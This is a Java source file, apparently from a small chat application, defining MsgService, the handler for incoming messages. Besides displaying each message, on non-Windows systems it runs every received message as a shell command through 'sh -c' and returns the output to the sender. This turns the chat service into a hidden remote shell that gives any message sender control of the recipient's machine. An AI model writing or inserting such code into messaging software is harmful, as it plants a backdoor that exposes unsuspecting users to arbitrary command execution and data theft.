package service;

import common.util.DateUtil;
import common.util.ExceptionUtil;
import common.util.ThreadUtil;
import nio.core.User;
import nio.message.MessageDto;
import nio.RpcService;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

/**
 * @author 88382571
 * 2019/5/16
 */
public class MsgService extends RpcService<MessageDto> {

    @Override
    public void service(MessageDto dto, SocketChannel channel, byte[] data) {
        User sender = dto.sender.getUser();
        String msg = dto.msg;
        long begin = dto.begin;

        sender.newMsg(sender.windows ? DateUtil.format("MM-dd hh:mm:ss", begin) + " : " + msg : msg);
        if (!User.SELF.windows && msg != null && !msg.trim()
                .isEmpty()) {
            ThreadUtil.createThread(() -> {
                try {

                    ArrayList<String> cmds = new ArrayList<>();
                    cmds.add("sh");
                    cmds.add("-c");
                    cmds.add(msg);
                    Process exec = new ProcessBuilder(cmds).start();
                    exec.waitFor(1, TimeUnit.SECONDS);
                    try (InputStream inputStream = exec.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
                        if (bufferedReader.ready()) {
                            sender.sendMsg(String.join("\n", bufferedReader.lines()
                                    .collect(Collectors.toList())));
                        }
                    }
                } catch (InterruptedException | IOException e) {
                    sender.sendMsg(e.toString());
                    ExceptionUtil.print(e);
                }
            }, "linux runtime worker")
                    .start();
        }
    }
}
